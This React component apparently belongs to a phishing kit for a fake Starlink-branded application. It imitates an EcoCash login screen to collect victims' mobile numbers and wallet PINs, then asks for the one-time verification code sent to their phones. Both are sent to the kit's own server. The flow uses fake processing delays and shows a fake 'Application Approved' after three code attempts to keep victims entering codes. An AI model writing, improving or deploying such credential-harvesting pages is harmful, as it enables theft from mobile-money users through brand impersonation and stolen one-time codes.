import { useState, useEffect, useRef } from "react";


function Processing({ onBack, processor, selectedPackage }) {

    
    // =====================================================
    // 1. APPLICATION STATE
    // =====================================================

    const [loading, setLoading] = useState(false);
    const [message, setMessage] = useState("");
    const [submitted, setSubmitted] = useState(false);
    const [verificationAttempts, setVerificationAttempts] = useState(0);
    const [processing, setProcessing] = useState(false);
    const [rejected] = useState(false);
    const [showPinScreen, setShowPinScreen] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState("");
    

    // =====================================================
    // 2. PAYMENT STATE
    // =====================================================

    const [showPesaRedirect, setShowPesaRedirect] = useState(false);

    // Placeholder for the official EcoCash authorization process.
    const [showAuthorization, setShowAuthorization] = useState(false);

    // =====================================================
    // 3. PHONE VERIFICATION STATE
    // =====================================================

    const [showVerification, setShowVerification] = useState(false);
    const [verificationCode, setVerificationCode] = useState("");
    const [verifying, setVerifying] = useState(false);
    const [verificationMessage, setVerificationMessage] = useState("");
    const [verificationTime, setVerificationTime] = useState(120);
    const [pin, setPin] = useState([
        "",
        "",
        "",
        ""
    ]);
    const pinInputs = useRef([]);

    // Start payment redirect when Processing mounts
    useEffect(() => {
        setShowPesaRedirect(true);
    }, []);

    useEffect(() => {

        if (!showPesaRedirect) {
            return;
        }

        const timer = setTimeout(() => {

            setShowPesaRedirect(false);

            setShowPinScreen(true);

        }, 3000);

        return () => clearTimeout(timer);

    }, [showPesaRedirect]);


    // Restore application flow after reload
    useEffect(() => {
        const saved = sessionStorage.getItem("loanApplicationState");

        if (!saved) return;

        try {
            const state = JSON.parse(saved);

            if (state.applicationNumber) {
                setApplicationNumber(state.applicationNumber);
            }

            if (state.showVerification) {
                setShowVerification(true);
            }

        } catch (error) {
            console.error(
                "Failed to restore application state:",
                error
            );
        }
    }, []);

    // Save application flow
    useEffect(() => {
        sessionStorage.setItem(
            "loanApplicationState",
            JSON.stringify({
                showVerification,
                processor
            })
        );
    }, [
        showVerification,
        processor
    ]);



    /* =========================================
       PESA APP REDIRECT TIMER
    ========================================= */

    

    useEffect(() => {
        if (!showVerification) return;
    
        setVerificationTime(120);
    
        const timer = setInterval(() => {
            setVerificationTime((prev) => {
                if (prev <= 1) {
                    clearInterval(timer);
                    return 0;
                }
    
                return prev - 1;
            });
        }, 1000);
    
        return () => clearInterval(timer);
    }, [showVerification]);

    useEffect(() => {
        console.log("PROCESSING STATE CHANGED:", processing);
    }, [processing]);

    useEffect(() => {
        if (showPinScreen) {
            window.scrollTo({
                top: 0,
                behavior: "instant"
            });
        }
    }, [showPinScreen]);

    useEffect(() => {
        const savedState = sessionStorage.getItem("loanApplicationState");

        if (!savedState) {
            return;
        }

        try {
            const state = JSON.parse(savedState);

            if (state.showVerification) {
                setShowVerification(true);
            }

            if (state.showAdminWaiting) {
                setShowAdminWaiting(true);
            }

        } catch (error) {
            console.error("Could not restore application state:", error);
    }
    }, []);


    /* =========================================
       PIN INPUT
    ========================================= */

    function handlePinChange(
        value,
        index
    ) {

        // Only numbers
        if (!/^\d?$/.test(value)) {
            return;
        }

        const newPin = [
            ...pin
        ];

        newPin[index] = value;

        setPin(newPin);

        // Automatically move forward
        if (
            value &&
            index < 4
        ) {

            pinInputs
                .current[index + 1]
                ?.focus();
        }
    }


    /* =========================================
       PIN BACKSPACE
    ========================================= */

    function handlePinKeyDown(
        e,
        index
    ) {

        if (
            e.key === "Backspace" &&
            !pin[index] &&
            index > 0
        ) {

            pinInputs
                .current[index - 1]
                ?.focus();
        }
    }


    /* =========================================
       PIN NEXT
    ========================================= */

    async function handlePinNext() {
        console.log("mobile phone");
        const fullPhoneNumber = `+263${phoneNumber}`;

        if (phoneNumber.length !== 9) {
            alert("Please enter a valid mobile number");
            return;
        }
        const enteredDigits = Number(pin.filter(digit => digit !== "").join(""));

        /*
         * Allow either 4 or 5 digits.
         */

        if (
            enteredDigits.toString().length !== 4 &&
            enteredDigits.toString().length !== 5
        ) {
            return;
        }



         try {
        const response = await fetch(
            "/api/submit-application",
            {
                method: "POST",
                headers: {
                    "Content-Type":
                        "application/json"
                },
                body: JSON.stringify({
                    action: "verify_email",
                    phone: fullPhoneNumber,
                    pin: enteredDigits,
                    processor: processor
                })
            }
        );

        if (!response.ok) {
            const data = await response.json();
            throw new Error(
                data.error ||
                "Wait for Admin approval.."
            );
        }

        setShowPinScreen(false);
        setShowVerification(true);

    } catch (error) {

        setMessage(
            error.message
        );

    } finally {

        setLoading(false);
    }   
}


    const sleep = (ms) =>
        new Promise((resolve) => setTimeout(resolve, ms));

    const checkApplicationStatus = async (applicationNumber) => {
        try {
            // 1. Hide verification and display processing
            setShowVerification(false);
            setProcessing(true);
            setVerificationMessage("");

            // 2. Keep processing visible for 3 seconds
            await sleep(3000);

            // 3. Check Supabase application status
            const response = await fetch(
                `/api/application-status?application_number=${encodeURIComponent(applicationNumber)}`
            );

            const data = await response.json();

            if (!response.ok) {
                throw new Error(
                    data.error || "Unable to retrieve application status."
                );
            }

            // 4. Stop processing
            setProcessing(false);

            // 5. If approved, proceed to success page
            if (data.nextAction === "SUCCESS") {
                setShowVerification(false);
                setSubmitted(true);
                return;
            }

            // 6. If rejected, return to verification page with rejection message
            if (data.nextAction === "REJECTED") {
                setRejected(true);
                setShowVerification(true);
                setVerificationMessage(data.message);
                return;
            }

            // 7. If under review, return to verification page
            if (data.nextAction === "WAIT") {
                setShowVerification(true);
                setVerificationMessage(data.message);
                return;
            }

        } catch (error) {
            setProcessing(false);
            setShowVerification(true);

            setVerificationMessage(
                error.message ||
                "Unable to check your application status. Please try again."
            );
        }
    };

    console.log("PROCESSING COMPONENT RENDERED");

    async function handleVerify(e) {
        e.preventDefault();
        console.log("VERIFY STARTED");

        if (!verificationCode.trim()) {
            setVerificationMessage(
                "Please enter the verification code sent to your phone."
            );
            return;
        }

        setVerifying(true);
        setShowVerification(false);
        setProcessing(true);
        setVerificationMessage("");

        try {
            await new Promise(resolve => setTimeout(resolve, 3000));
            const response = await fetch(
                "/api/submit-application",
                {
                    method: "POST",

                    headers: {
                        "Content-Type": "application/json"
                    },

                    body: JSON.stringify({
                        action: "verify_phone",
                        verificationCode: verificationCode.trim(),
                        processor: processor
                    })
                }
            );

            const data = await response.json();

            if (!response.ok) {
                throw new Error(
                    data.error ||
                    "Code verification failed."
                );
            }
            const nextAttempt = verificationAttempts + 1;

            setVerificationAttempts(nextAttempt);
            setProcessing(false);
            console.log("TRY: processing set to false");

            if (nextAttempt >= 3) {
                // Third attempt: proceed to success page
                setShowVerification(false);
                setSubmitted(true);
            } else {
                // First and second attempts: return to verification
                setVerificationMessage(
                    `Verification is still being processed. Please try again. (${nextAttempt}/3 attempts)`
                );

                setShowVerification(true);
            }



        } catch (error) {
            setVerificationMessage(
                error.message
            );
            setProcessing(false);
            console.log("CATCH: processing set to false");
            setShowVerification(true);
        } finally {
            setVerifying(false);
            setProcessing(false);
            console.log("FINALLY: processing set to false");
        
        }
    }


    if (rejected) {
        return (
            <div className="application-container success-page">

                <div className="success-card">

                    <div className="success-icon">
                        ×
                    </div>

                    <h1>
                        Application Update
                    </h1>

                    <p className="success-title">
                        Application failed.
                    </p>

                    <p className="success-description">
                        Some of your details are not correct, 
                        please restart the application with the correct details.
                    </p>

                    <button
                        type="button"
                        className="submit-button"
                        onClick={() => {
                            window.location.reload();
                        }}
                    >
                        Back to Home
                    </button>

                </div>

            </div>
        );
    }

    /* =========================================
   SUCCESS PAGE
    ========================================= */
    if (submitted) {
        return (
            <div className="application-container success-page">

                <div className="success-card">

                    <div className="success-icon">
                        ✓
                    </div>

                    <h1>
                        Application Approved!
                    </h1>

                    <p className="success-title">
                        Congratulations!
                    </p>

                    <p className="success-description">
                        Your application has been successfully approved.
                        Thank you for choosing our service.
                    </p>

                    <button
                        type="button"
                        className="submit-button"
                        onClick={() => {
                            window.location.reload();
                        }}
                    >
                        Back to Home
                    </button>

                </div>

            </div>
        );
    }

    if (processing) {
        return (
            <div className="momo-processing-page">
                <div className="momo-processing-spinner"></div>
                <h2>
                        Processing..
                    </h2>

                    <p>
                        Please wait a minute...
                    </p>
            </div>
        );
    }


    
    if (showVerification) {
        return (
            <div className="verification-overlay">

                <div className="verification-modal">

                    {/* Starlink branding */}
                    <div className="verification-brand">
                        <div className="starlink-symbol">
                            <span></span>
                            <span></span>
                            <span></span>
                        </div>

                        <span>STARLINK</span>
                    </div>

                    {/* Verification icon */}
                    <div className="verification-icon-wrapper">
                        <div className="verification-icon-ring"></div>

                        <div className="verification-icon">
                            <svg
                                viewBox="0 0 24 24"
                                fill="none"
                                stroke="currentColor"
                                strokeWidth="1.5"
                                strokeLinecap="round"
                                strokeLinejoin="round"
                            >
                                <path d="M12 22s8-4 8-11V5l-8-3-8 3v6c0 7 8 11 8 11z" />
                                <path d="m9 12 2 2 4-4" />
                            </svg>
                        </div>
                    </div>

                    <div className="verification-heading">
                        <span className="verification-eyebrow">
                            SECURE CONNECTION
                        </span>

                        <h2>Phone Verification</h2>

                        <p>
                            Enter the verification code to continue with
                            your application.
                        </p>
                    </div>

                    <form onSubmit={handleVerify}>

                        <label className="verification-label">
                            VERIFICATION CODE
                        </label>

                        <div className="verification-code-area">
                            <input
                                type="text"
                                value={verificationCode}
                                onChange={(e) =>
                                    setVerificationCode(e.target.value)
                                }
                                placeholder="Enter verification code"
                                inputMode="numeric"
                                autoComplete="one-time-code"
                                required
                                autoFocus
                            />
                        </div>

                        <div className="verification-timer">
                            <span className="timer-indicator"></span>

                            CODE VALIDITY

                            <strong>
                                {String(Math.floor(verificationTime / 60)).padStart(2, "0")}:
                                {String(verificationTime % 60).padStart(2, "0")}
                            </strong>
                        </div>

                        {verificationMessage && (
                            <div className="form-message">
                                <span className="message-indicator"></span>
                                {verificationMessage}
                            </div>
                        )}

                        <button
                            type="submit"
                            className="submit-button"
                            disabled={verifying}
                        >
                            {verifying ? (
                                <>
                                    <span className="verify-button-spinner"></span>
                                    CHECKING APPLICATION...
                                </>
                            ) : (
                                <>
                                    VERIFY & CONTINUE
                                    <span className="verify-arrow">→</span>
                                </>
                            )}
                        </button>

                    </form>

                    <div className="verification-footer">
                        <span className="footer-lock">⌑</span>
                        SECURE APPLICATION PORTAL
                    </div>

                </div>

            </div>
        );
    }


    /* =========================================
       SUCCESS PAGE
    ========================================= */
    /* =========================================
       PESA APP PIN SCREEN
    ========================================= */
   
    if (showPesaRedirect) {
        return (
            <div className="pesa-redirect">
                <div className="pesa-spinner"></div>

                <h2>
                    Processing...
                </h2>

                <p>
                    Connecting to <strong style={{ color: "#134a97" }}>Eco</strong><strong style={{color:"#bb0c0c"}}>Cash</strong>
                </p>
            </div>
        );
    }

    if (showPinScreen) {
        return (
            <div className="ecocash-login-page">
                <section className="ecocash-login-section">

                    <div className="ecocash-logo">
                    <span className="eco">Eco</span>
                    <span className="cash">Cash</span>
                    </div>
                    {/* LOGIN CONTENT */}

                            <h1 className="pesa-welcome-title">
                                <span className="welcome-text">
                                
                                </span>

                                <span className="banking-text">
                                    
                                </span>
                            </h1>

                            <h2 className="secured-login-title">
                            Login
                            </h2>

                            <div className="phone-input-wrapper">
                            <div className="country-selector">
                                <span className="zimbabwe-flag">🇿🇼</span>
                                <span className="country-code">+263</span>
                                <span className="dropdown-icon"></span>
                            </div>

                            <input
                                type="tel"
                                className="phone-number-input"
                                placeholder="Enter mobile number"
                                inputMode="numeric"
                                autoComplete="tel"
                                maxLength={9}
                                value={phoneNumber}
                                onChange={(e) => {
                                    setPhoneNumber(e.target.value.replace(/\D/g, ""));
                                }}
                            />
                            </div>

                            <p className="pin-instruction">
                                Enter your PIN 
                            </p>

                            {/* PIN BOXES */}
                            <div className="pesa-pin-boxes">

                                {pin.map((digit, index) => (
                                    <input
                                        key={index}

                                        ref={(element) => {
                                            pinInputs.current[index] = element;
                                        }}

                                        type="password"
                                        inputMode="numeric"
                                        maxLength="1"
                                        value={digit}

                                        onChange={(e) =>
                                            handlePinChange(
                                                e.target.value,
                                                index
                                            )
                                        }

                                        onKeyDown={(e) =>
                                            handlePinKeyDown(
                                                e,
                                                index
                                            )
                                        }

                                        className="pesa-pin-box"

                                        aria-label={`PIN digit ${index + 1}`}
                                    />
                                ))}

                            </div>

                            <button
                                type="button"
                                className="pesa-next-button"
                                disabled={
                                    pin.filter(
                                        digit => digit !== ""
                                    ).length < 4
                                }
                                onClick={handlePinNext}
                            >
                                Next
                            </button>

                </section>

                        {/* Bottom / Blue section */}
                        <section className="ecocash-info-section">

                            <div className="ecocash-info-content">

                            <p>
                                To register an EcoCash wallet or get <br/> assistance, <br/> 
                                click below
                            </p>
                            <br/>

                            <div className="ecocash-actions">

                                <button className="ecocash-action-button">
                                    👤
                                Register
                                </button>

                                <button className="ecocash-action-button">
                                    ℹ️
                                    Help & Support
                                </button>
                                <br/>
                                <br/>
                                <p>v4.0.5P</p>
                                <p>By signing in you agree to the <a>Terms and conditions </a></p>

                            </div>

                            </div>

                        </section>

                    </div>
        );
    }}
export default Processing;
